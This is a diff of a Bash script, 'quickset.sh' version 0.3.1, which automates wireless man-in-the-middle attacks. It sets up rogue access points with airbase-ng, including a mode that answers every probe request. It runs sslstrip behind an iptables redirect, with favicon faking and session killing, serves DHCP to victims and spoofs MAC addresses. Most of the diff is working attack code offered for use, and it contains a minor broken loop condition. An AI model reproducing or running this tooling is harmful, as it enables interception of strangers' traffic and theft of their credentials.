@@ -3,7 +3,7 @@ function head()
 {
 ##~~~~~~~~~~~~~~~~~~~~~~~~~ File and License Info ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 ## Filename: quickset.sh
-## Version: 0.3
+## Version: 0.3.1
 ## Copyright (C) <2009>  <Snafu>
 
 ##  This program is free software: you can redistribute it and/or modify
@@ -45,6 +45,16 @@ function head()
 ##_____________________________________________________________________________##
 
 
+##~The Following Required Programs Must be in Your Path for Full Functionality~##
+## macchanger
+## Hamster & Ferret
+## sslstrip
+## arpspoof
+## aircrack-ng suite
+## dhcpd3-server
+##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
+
+
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Requested Help ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 ## How can I kill the function loop issue?  A function always wants to finish, even if called off to another function...Useful, but how to kill;  return should work possibly??
 
@@ -63,12 +73,22 @@ function head()
 
 ### Should managed mode channel match monitor mode channel????????
 
-### Tail a log for who has connected to the dhcp server
-
 ### Figure out if old PIDs are used during a cycle...if not we'll do PID assignments to ensure kill -9s
 ### Use PIDs to make a greppable list
 
 ### Sanitize available devices?
+
+### Where to throw ap_check nullification
+
+### Find out why the leases look this way /var/lib/dhcp3/dhcpd.leases
+###  lease 192.168.10.100 {
+###  starts 4 2011/10/06 19:01:58;
+###  ends 4 2011/10/06 19:03:10;
+###  cltt 4 2011/10/06 19:01:58;
+###  binding state active;
+###  next binding state free;
+
+### Remove the needlessness of a var= for some while loops
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 
@@ -89,15 +109,16 @@ function head()
 
 ## rand_mac=`ifconfig $mac_dev | awk '{print $5}'` && rand_mac=`echo $rand_mac | awk '{print $1}'` (Works)
 ## -versus-
-## ifconfig $mac_dev | grep HWaddr | awk '{print $5} (Failed to work
+## ifconfig $mac_dev | grep HWaddr | awk '{print $5} (Failed to work)
 
 ## I have no idea why the later command failed to work, I will investigate this later on.
 
-## Hindsight 20/20 the solution was simple, but it took every ounce of patience I had to keep pursuing the end goal.  This just shows how much dedication really pays off if you want something bad enough... 
+## Hindsight 20/20 the solution was simple, but it took every ounce of patience I had to keep pursuing the end goal.  This just shows how much dedication really pays off if you want something bad enough.  It's what I've truly come to love about my affliction with hacking.
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 
 ##~~~~~~~~~~~~~~~~~~~~~~~~ Planned Implementations ~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
+## Custom DNS Entries for DHCP Server
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 
@@ -116,6 +137,11 @@ function head()
 ## --- 192.168.10.100 ping statistics ---
 ## 1103 packets transmitted, 688 received, +1 duplicates, 37% packet loss, time 1106321ms
 ## rtt min/avg/max/mdev = 3.402/6.487/12.889/0.974 ms
+
+## I then setup a softap without using a dhcp server; with the following parameters
+## airbase-ng mon0 -c 6 -e "poof"
+## ifconfig at0 up 169.254.191.1 netmask 255.255.255.0
+## Roughly 5 minutes into it a segmentation fault occured
 
 ## My next step will be to try this on Lucid Lynx since it is roughly the same
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
@@ -145,35 +171,30 @@ echo -e "\033[1;32m\n-----------------------------------------------------------
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                                    Initial NIC Setup
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
-(L)ist Available NICs
+1) Wireless NIC           [\033[1;33m$pre_pii\033[36m] (Disregard this if already in Monitor Mode)
 
-(I)nternet Connected NIC [\033[1;33m$IE\033[36m]
+2) Enable Monitor Mode    [\033[1;33m$pre_pii\033[36m] (Disregard this if already in Monitor Mode)
 
-(W)ireless NIC (Should Be Capable of Monitor Mode or be the Monitor Mode Device) [\033[1;33m$pii\033[36m]
+3) Internet Connected NIC [\033[1;33m$IE\033[36m]
 
-(E)nable Monitor Mode [\033[1;33m$pii\033[36m] (Disregard this if already in Monitor Mode)
+4) Monitor Mode NIC       [\033[1;33m$pii\033[36m]
 
-(K)ill Monitor Mode
+5) Kill Monitor Mode
 
-(M)AC Address Options
+6) MAC Address Options
 
-(F)inished\033[1;34m
+7) List Available NICs
+
+8) Proceed\033[1;34m
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
 read init_var
 case $init_var in
-	l|L) nics--
-	init_setup--;;
-
-	i|I) echo -e "\033[36m\nDefine NIC" 
-	read IE
-	init_setup--;;
-
-	w|W) var=x
+	1) var=x
 	echo -e "\033[36m\nDefine NIC"
-	read pii
+	read pre_pii
 	init_setup--;;
 
-	e|E) if [[ $var != x ]]; then
+	2) if [[ $var != x ]]; then
 		echo -e "\033[31mYOU MUST DEFINE THE WIRELESS NIC FIRST"
 		read
 		init_setup--
@@ -182,13 +203,24 @@ case $init_var in
 		init_setup--
 	fi;;
 
-	k|K) kill_mon=x
+	3) echo -e "\033[36m\nDefine NIC" 
+	read IE
+	init_setup--;;
+
+	4) echo -e "\033[36m\nDefine NIC" 
+	read pii
+	init_setup--;;
+
+	5) kill_mon=x
 	monitormode--
 	init_setup--;;
 
-	m|M) mac_control--;;
+	6) mac_control--;;
 
-	f|F) main_menu--;;
+	7) nics--
+	init_setup--;;
+
+	8) main_menu--;;
 
 	*) init_setup--;;
 esac
@@ -197,7 +229,6 @@ esac
 monitormode--()
 {
 var= ## Nulled
-IM= ## Device name assigned to Monitor Mode
 KM= ## Device to kill
 KM_II= ## Physical device to kill
 clear
@@ -235,13 +266,14 @@ echo -e "\033[31m\n
 	echo -e "\n\n\033[1;32mPress Enter to Continue"
 	read
 else
-	airmon-ng start $pii
+	airmon-ng start $pre_pii
 	sleep 1
-	while [ -z $IM ];do
-		echo -e "\033[36m\nDevice Name Assigned for Monitor Mode on \033[1;33m$pii\033[36m?\n(i.e.  mon0, mon1, mon2?, etc....)"
-		read IM
+	var= ## Nulled
+	while [ -z $var ];do
+		echo -e "\033[36m\nDevice Name Assigned for Monitor Mode on \033[1;33m$pre_pii\033[36m?\n(i.e.  mon0, mon1, mon2?, etc....)"
+		read var
 	done
-	pii=$IM
+	pii=$var
 fi
 ## The below variable is kinda useless I believe, I noticed it during the Random MAC creation of this script.  I put it in the top of this script for some reason, but that eludes me now.  If found to be useless, please let me know to remove it and save a line.
 var= ## Nulled
@@ -293,10 +325,10 @@ This script requires Physical and Virtual devices to have matching MAC Addresses
 	while [[ $var_II != x ]];do
 		echo -e "\033[36m\nDoes \033[1;33m$mac_dev\033[36m have a Monitor Mode NIC associated with it? (y or n)"
 		read var
- 		case $var in
- 			n|N|y|Y) var_II=x ;;
- 			*) var_II= ;;
- 		esac
+		case $var in
+			n|N|y|Y) var_II=x ;;
+			*) var_II= ;;
+		esac
 	done
 	case $var in
 		y|Y) case $rand in
@@ -330,7 +362,7 @@ This script requires Physical and Virtual devices to have matching MAC Addresses
 					read
 					mac_control--
 				fi
- 			fi;;
+			fi;;
 
 			n|N) echo -e "\033[36m\nMonitor Mode NIC name?"
 			read mac_devII
@@ -418,8 +450,9 @@ case $var in
 	c|C) mac_control_II--;;
 
 	p|P) case $init_var in
-		m|M) init_setup--;;
-		*) setups--;;
+		6) init_setup--;;
+		*) init_var=
+		setups--;;
 	esac;;
 
 	m|M) main_menu--;;
@@ -440,7 +473,7 @@ echo -e "\033[1;34m\n\n\n\n\n\n\n
 QuickSet - A Quick Way to Setup a Wired/Wireless Hack
       Author: Snafu ----> will@configitnow.com
            Read Comments Prior to Usage
-            Ver 0.3 (6 October 2011)\033[1;33m
+           Version 0.3.1 (7 October 2011)\033[1;33m
 
 
         IP Forwarding via the Kernel Enabled
@@ -635,7 +668,8 @@ esac
 
 routing--()
 {
-## The order of functions are: pre_var--(), variables--(), ap--(), dhcp_set--(), routing--()
+## The order of functions are for 2, 3 and 4 are: ap_pre_var--(), ap_setup--(), ap--()
+## The order of functions for the DHCP server is: dhcp_pre_var--(), dhcp_svr--()
 # rte_choice= Routing Option Variable for use with IPTABLES setups...
 private= ## Wifi Range Extender trip variable
 clear
@@ -651,32 +685,49 @@ echo -e "\033[1;34m
 
 4) WiFi Range Extender
 
-5) Return to the Main Menu\033[1;34m
+5) DHCP Server
+
+6) Return to the Main Menu\033[1;34m
 ~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
 read rte_choice
 case $rte_choice in
 	1) k_for--;;
 
-	2) if  [ -z $IE ];then
-		echo -e "\033[31mYou MUST define an Internet Connected NIC before proceeding"
+	2) if  [[ -z $IE || -z $pii ]];then
+		echo -e "\033[31mMonitor Mode NIC and Internet Connected NIC MUST be defined before proceeding"
 		read
 		routing--
 	else
-		pre_var--
+		ap_pre_var--
+		ap_setup--
 	fi;;
 
-	3) pre_var--;;
+	3) if  [[ -z $pii ]];then
+		echo -e "\033[31mMonitor Mode NIC MUST be defined before proceeding"
+		read
+		routing--
+	else
+		ap_pre_var--
+		ap_setup--
+	fi;;
 
-	4) if  [ -z $IE ];then
-		echo -e "\033[31mYou MUST define an Internet Connected NIC before proceeding"
+	4) if  [[ -z $IE || -z $pii ]];then
+		echo -e "\033[31mMonitor Mode NIC and Internet Connected NIC MUST be defined before proceeding"
 		read
 		routing--
 	else
 		private=x
-		pre_var--
+		ap_pre_var--
+		ap_setup--
 	fi;;
 
-	5) main_menu--;;
+	5) dhcp_pre_var--
+	if [[ $ap_check != x ]]; then
+		ap_pre_var--
+	fi
+	dhcp_svr--;;
+
+	6) main_menu--;;
 
 	*) routing--;;
 esac
@@ -746,8 +797,8 @@ Doing so requires that you rename them for this script to work properly\033[31m
 done
 case $var in
 	y|Y) IE= ## Nulled
-	IM= ## Nulled
 	pii= ## Nulled
+	pre_pii= ## Nulled
 	init_setup--;;
 	
 	n|N) setups--;;
@@ -954,12 +1005,12 @@ ferret_II--
 
 strip_em--()
 {
-lst_port=48450
-sstrip_log=sstrip_log
-log_opt="-p"
-lck_fav=Yes
-ses_kil=Yes
-tail_log=Yes
+lst_port=48450 ## Port to listen on
+sstrip_log=sstrip_log ## Log Filename
+log_opt="-p" ## Logging option
+lck_fav=Yes ## Favicon Variable
+ses_kil=Yes ## Kill Sessions Variable
+ssl_tail=Yes ## SSLStrip Tail Log
 	strip_em_III--()
 	{
 	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $lst_port
@@ -973,7 +1024,7 @@ tail_log=Yes
 		xterm -bg black -fg grey -sb -rightbar -title SSLStrip -e sslstrip -w $sstrip_log $log_opt -l $lst_port &
 	fi
 	sleep 2
-	case $tail_log in
+	case $ssl_tail in
 		Yes) xterm -bg black -fg grey -sb -rightbar -title "SSLStrip Tail" -e tail -f $sstrip_log & ;;
 	esac
 	atk_menu--
@@ -996,7 +1047,7 @@ tail_log=Yes
 
 5) Kill Sessions in Progress  [\033[1;33m$ses_kil\033[36m]
 
-6) Tail the Log               [\033[1;33m$lck_fav\033[36m]
+6) Tail SSLStrip Log          [\033[1;33m$ssl_tail\033[36m]
 
 7) Return to Previous Menu
 
@@ -1013,7 +1064,7 @@ tail_log=Yes
 		2) echo -e "\033[36m\nDefine Log Name"
 		read sstrip_log
 		strip_em_II--;;
-
+### Sanitize later?
 		3) echo -e "\033[1;34m\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
              --Define Logging Options--
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
@@ -1032,38 +1083,47 @@ tail_log=Yes
 		esac
 		strip_em_II--;;
 
-		4) echo -e "\033[36mFake a Favicon? (y or n)"
-		read lck_fav
-		case $lck_fav in
-			y|Y) lck_fav=Yes ;;
-			n|N) lck_fav=No ;;
-			*) lck_fav=Yes ;;
- 		esac
+		4) lck_fav= ## Nulled
+		while [ -z $lck_fav ];do
+			echo -e "\033[36mFake a Favicon? (y or n)"
+			read lck_fav
+			case $lck_fav in
+				y|Y) lck_fav=Yes ;;
+				n|N) lck_fav=No ;;
+				*) lck_fav= ;;
+			esac
+		done
 		strip_em_II--;;
 
-		5) echo -e "\033[36mKill Present Sessions? (y or n)"
-		read ses_kil
-		case $ses_kil in
-			y|Y) ses_kil=Yes ;;
-			n|N) ses_kil=No ;;
-			*) ses_kil=Yes ;;
- 		esac
+		5) ses_kil= ## Nulled
+		while [ -z $ses_kil ];do
+			echo -e "\033[36mKill Present Sessions? (y or n)"
+			read ses_kil
+			case $ses_kil in
+				y|Y) ses_kil=Yes ;;
+				n|N) ses_kil=No ;;
+				*) ses_kil= ;;
+			esac
+		done
 		strip_em_II--;;
 
-		6) echo -e "\033[36mCreate a Tail of the SSLStrip Log? (y or n)"
-		read tail_log
-		case $tail_log in
-			y|Y) tail_log=Yes ;;
-			n|N) tail_log=No ;;
-			*) tail_log=Yes ;;
- 		esac
+		6) ssl_tail= ## Nulled
+		while [ -z $ssl_tail= ];do
+			echo -e "\033[36mCreate a Tail of the SSLStrip Log? (y or n)"
+			read ssl_tail
+			case $ssl_tail in
+				y|Y) ssl_tail=Yes ;;
+				n|N) ssl_tail=No ;;
+				*) ssl_tail= ;;
+			esac
+		done
 		strip_em_II--;;
 
 		7) atk_menu--;;
 
 		8) main_menu--;;
 
-		9) if [[ -z $lst_port || -z $sstrip_log || -z $log_opt || -z $lck_fav || -z $ses_kil || -z $tail_log ]];then
+		9) if [[ -z $lst_port || -z $sstrip_log || -z $log_opt || -z $lck_fav || -z $ses_kil || -z $ssl_tail ]];then
 			echo -e "\033[31mAll Fields Must be Filled Before Proceeding"
 			read
 			strip_em_II--
@@ -1152,13 +1212,85 @@ case $var in
 esac
 }
 
-dhcp_set--()
+dhcp_pre_var--()
+{
+dhcp_dev=at0 ## Device to setup DHCP server on
+sas=192.168.10.0 ## DHCP Subnet 
+sair="192.168.10.100 192.168.10.200" ## DHCP IP range
+dhcp_tail=Yes ## DHCP Tail Log
+dhcp_check=x ## Not sure if I need this, leaving for now
+}
+
+dhcp_svr--()
 {
 var= ## Nulled
 dhcp_svr_stat= ## Variable for Cleanup Purposes..
 DHCPDCONF="/tmp/dhcpd.conf" ## Used by dhcpd3
 	dhcp_func--()
 	{
+	clear
+	echo -e "\033[1;34m
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+              --DHCP Server Parameters--\033[31m
+
+DO NOT USE [\033[1;33m`route -n | awk '/UG/ { print $2 }'`\033[31m] FOR THE GATEWAY IP ADDRESS\033[1;34m
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
+1) DHCP Server Device  [\033[1;33m$dhcp_dev\033[36m]
+
+2) Gateway IP Address  [\033[1;33m$sapip\033[36m]
+
+3) Subnet Mask         [\033[1;33m$sasm\033[36m]
+
+4) Subnet              [\033[1;33m$sas\033[36m]
+
+5) IP Range            [\033[1;33m$sair\033[36m]
+
+6) Tail DHCP Log       [\033[1;33m$dhcp_tail\033[36m]
+
+7) Proceed\033[1;34m
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
+	read var
+	case $var in
+		1) echo -e "\033[36m\nDHCP Server Device?"
+		read dhcp_dev
+		dhcp_func--;;
+
+		2) echo -e "\033[36m\nGateway IP Address?"
+		read sapip
+		dhcp_func--;;
+
+		3) echo -e "\033[36m\nSubnet Mask?"
+		read sasm
+		dhcp_func--;;
+
+		4) echo -e "\033[36m\nSubnet?"
+		read sas
+		dhcp_func--;;
+
+		5) echo -e "\033[36m\nIP Range?"
+		read sair
+		dhcp_func--;;
+
+		6) dhcp_tail= ## Nulled
+		while [ -z $dhcp_tail ];do
+			echo -e "\033[36mCreate a Tail of the DHCP Log? (y or n)"
+			read dhcp_tail
+			case $dhcp_tail in
+				y|Y) dhcp_tail=Yes ;;
+				n|N) dhcp_tail=No ;;
+				*) dhcp_tail= ;;
+			esac
+		done
+		dhcp_func--;;
+
+		7) if [[ -z $dhcp_dev || -z $sapip || -z $sasm || -z $sas || -z $sair ]];then
+			echo -e "\033[31mAll Fields Must be Filled Before Proceeding"
+			read
+			dhcp_func--
+		fi;;
+
+		*) dhcp_func--;;
+	esac
 	## Clear any dhcp leases that might have been left behind
 	echo > /var/lib/dhcp3/dhcpd.leases
 	## Empty the file to start clean
@@ -1173,16 +1305,20 @@ DHCPDCONF="/tmp/dhcpd.conf" ## Used by dhcpd3
 	echo "subnet $sas netmask $sasm {" >> /tmp/dhcpd.conf
 	echo "range $sair;" >> /tmp/dhcpd.conf
 	echo "option routers $sapip;" >> /tmp/dhcpd.conf
-	for d in $(cat /etc/resolv.conf | sed -r 's/^.* ([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}).*$/\1/' | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}');do
-		echo "option domain-name-servers $d;" >> /tmp/dhcpd.conf
+## Old messy way of doing things
+# 	for sadns in $(cat /etc/resolv.conf | sed -r 's/^.* ([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}).*$/\1/' | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}');do
+## Cleaner way of doing things
+	for sadns in $(grep nameserver /etc/resolv.conf | awk '{print $2}');do
+		echo "option domain-name-servers $sadns;" >> /tmp/dhcpd.conf
 	done
 	echo "}"  >> /tmp/dhcpd.conf
 	}
 
-	dhcp_set_II--()
+	dhcp_svr_II--()
 	{
 	echo -e "\033[1;33m"
-	dhcpd3 -cf $DHCPDCONF at0
+# 	xterm -bg black -fg grey -sb -rightbar -hold -title "DHCP Server" -e dhcpd3 -cf $DHCPDCONF $dhcp_dev &
+	dhcpd3 -cf $DHCPDCONF $dhcp_dev &
 	dhcp_svr_stat=x
 	if [ $? -ne 0 ];then
 		echo -e "\033[31mThe DHCP server could not be started\nPress Enter to Return to Routing Features"
@@ -1198,51 +1334,55 @@ DHCPDCONF="/tmp/dhcpd.conf" ## Used by dhcpd3
 
 			4) iptables -t nat -A POSTROUTING -o $IE -j MASQUERADE;;
 		esac
+		case $dhcp_tail in
+			Yes) xterm -bg black -fg grey -sb -rightbar -title "DHCP Server Tail" -e tail -f /var/lib/dhcp3/dhcpd.leases & ;;
+		esac
 		echo -e "\033[1;33m\n\n\n\nDHCP server started succesfully\n\n"
 		sleep 3
-		echo -e "\033[1;32m\n\n\n\nPress Enter to Return to Main Menu"
+		echo -e "\033[1;32m\n\n\n\nPress Enter to Return to Routing Features"
 		read
-		main_menu--
+		routing--
 	fi
 	}
 
 if [ -e $DHCPDCONF ] ; then
 	while [ -z $var ];do
-	echo -e "\033[31m\nDHCPD Configuration File Exists\033[36m\n
+	echo -e "\033[31m\nDHCP Server Configuration File Exists\033[36m\n
 Create New File [\033[31mDeleting /tmp/dhcpd.conf\033[36m] (y or n)?"
 	read var
 	case $var in
 		y|Y) dhcp_func--
-		dhcp_set_II--;;
+		dhcp_svr_II--;;
 
-		n|N) dhcp_set_II--;;
+		n|N) echo > /var/lib/dhcp3/dhcpd.leases ## Clear any dhcp leases that might have been left behind
+		dhcp_svr_II--;;
 
 		*) var= ;;
 	esac
 	done
 else
 	dhcp_func--
-	dhcp_set_II--
+	dhcp_svr_II--
 fi
 }
 ##-----------------------------------------------------------------------------##
 
 ##~~~~~~~~~~~~~~~~~~~~~~~ routing-- shared sub-functions ~~~~~~~~~~~~~~~~~~~~~~##
-pre_var--()
+ap_pre_var--()
 {
 sapip=192.168.10.1 ## SoftAP IP Address
 sasm=255.255.255.0 ## SoftAP Subnet Mask
-sas=192.168.10.0 ## Soft AP Subnet 
-sair="192.168.10.100 192.168.10.200" ## SoftAP 
-sac=6
-mtu_size=1500
-variables--
+sac=6 ## SoftAP Channel
+mtu_size=1500 ## MTU Size
+dhcp_autol=Yes ## DHCP Autolaunch for speed and intensity purposes
+ap_check=x ## Variable to make sure these pre-variables are called if DHCP server is done prior to SoftAP
 }
 
-variables--()
+ap_setup--()
 {
 	var_meth--()
 	{
+	clear
 	BB= ## Nulled
 	while [ -z $BB ];do
 		echo -e "\033[1;34m
@@ -1263,64 +1403,71 @@ variables--()
 
 clear
 echo -e "\033[1;34m
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-                 --Soft AP Parameters--\033[31m
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+                        --Soft AP Parameters--\033[31m
 
-DO NOT USE [\033[1;33m`route -n | awk '/UG/ { print $2 }'`\033[31m] FOR THE SOFTAP IP ADDRESS\033[1;34m
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
-1) SoftAP IP Address  [\033[1;33m$sapip\033[36m]
+        DO NOT USE [\033[1;33m`route -n | awk '/UG/ { print $2 }'`\033[31m] FOR THE SOFTAP IP ADDRESS\033[1;34m
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
+1) SoftAP Physical Device [\033[1;33m$pre_pii\033[36m] (Not The Monitor Mode Device Name)
 
-2) SoftAP Subnet Mask [\033[1;33m$sasm\033[36m]
+2) SoftAP IP Address      [\033[1;33m$sapip\033[36m]
 
-3) SoftAP Subnet      [\033[1;33m$sas\033[36m]
+3) SoftAP Subnet Mask     [\033[1;33m$sasm\033[36m]
 
-4) SoftAP IP Range    [\033[1;33m$sair\033[36m]
+4) SoftAP Channel         [\033[1;33m$sac\033[36m]
 
-5) SoftAP Channel     [\033[1;33m$sac\033[36m]
+5) MTU Size               [\033[1;33m$mtu_size\033[36m]
 
-6) MTU Size           [\033[1;33m$mtu_size\033[36m]
+6) DHCP Server Autolaunch [\033[1;33m$dhcp_autol\033[36m]
 
 7) Proceed\033[1;34m
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
 	read var
 case $var in
-	1) echo -e "\033[36m\nSoftAP IP Address?"
+	1) echo -e "\033[36m\nSoftAP Physical Device?"
+	read pre_pii
+	ap_setup--;;
+
+	2) echo -e "\033[36m\nSoftAP IP Address?"
 	read sapip
-	variables--;;
+	ap_setup--;;
 
-	2) echo -e "\033[36m\nSoftAP Subnet Mask?"
+	3) echo -e "\033[36m\nSoftAP Subnet Mask?"
 	read sasm
-	variables--;;
+	ap_setup--;;
 
-	3) echo -e "\033[36m\nSoftAP Subnet?"
-	read sas
-	variables--;;
-
-	4) echo -e "\033[36m\nSoftAP IP Range?"
-	read sair
-	variables--;;
-
-	5) echo -e "\033[36m\nSoftAP Channel?"
+	4) echo -e "\033[36m\nSoftAP Channel?"
 	read sac
 	case $sac in
 		1|2|3|4|5|6|7|8|9|10|11) ;;
 		*) sac=6 ;;
 	esac
-	variables--;;
+	ap_setup--;;
 
-	6) echo -e "\033[36mDesired MTU Size?"
+	5) echo -e "\033[36mDesired MTU Size?"
 	read mtu_size
-	variables--;;
+	ap_setup--;;
 
-	7) if [[ -z $sapip || -z $sasm || -z $sas || -z $sair || -z $sac || -z $mtu_size ]];then
+	6) dhcp_autol= ## Nulled
+	while [ -z $dhcp_autol ];do
+		echo -e "\033[36mAutolaunch DHCP Server? (y or n)"
+		read dhcp_autol
+		case $dhcp_autol in
+			y|Y) dhcp_autol=Yes ;;
+			n|N) dhcp_autol=No ;;
+			*) dhcp_autol= ;;
+ 		esac
+	done
+	ap_setup--;;
+
+	7) if [[ -z $pre_pii || -z $sapip || -z $sasm || -z $sac || -z $mtu_size || -z $dhcp_autol ]];then
 		echo -e "\033[31mAll Fields Must be Filled Before Proceeding"
 		read
-		variables--
+		ap_setup--
 	fi;;
 
-	*) variables--;;
+	*) ap_setup--;;
 esac
-clear
 if [[ $private = x ]]; then
 	BB=3
 	ap--
@@ -1331,6 +1478,9 @@ fi
 
 ap--()
 {
+## pres_mac= ## MAC Address for the SoftAP
+pres_mac=`ifconfig $pre_pii | awk '{print $5}'`
+pres_mac=`echo $pres_mac | awk '{print $1}'`
 ## blackhole targets every single probe request on current channel
 modprobe tun
 if [ $BB = 1 ]; then
@@ -1341,7 +1491,6 @@ elif [ $BB = 2 ]; then
 	echo -e "\033[36mDesired ESSID?"
 	read SSID
 	xterm -bg black -fg grey -sb -rightbar -title "Bullzeye AP" -e airbase-ng -c $sac -e "$SSID" $pii &
-
 	clear
 elif [ $BB = 3 ];then
 	private= ## Nulled
@@ -1365,10 +1514,16 @@ fi
 echo -e "\033[1;33mConfiguring Devices.............."
 sleep 10
 ## Make sure to use matching MTUs for all NICs that are a part of this script, otherwise undesired results may occur.
+macchanger -m $pres_mac at0
 ifconfig at0 up $sapip netmask $sasm
 ifconfig $pii mtu $mtu_size
 ifconfig at0 mtu $mtu_size
-dhcp_set--
+if [[ $dhcp_autol = Yes ]];then
+	dhcp_pre_var--
+	dhcp_svr--
+else
+	routing--
+fi
 }
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
@@ -2129,6 +2284,7 @@ fi
 if [ -z $1  ]; then
 	var= ## Multiple Use Variable to conserve use of different variable names
 	IE= ## Internet Connected NIC
+	pre_pii= ##
 	pii= ## Dual mode variable, can be monitormode variable, or device to be assigned to monitor mode
 	greet--
 else
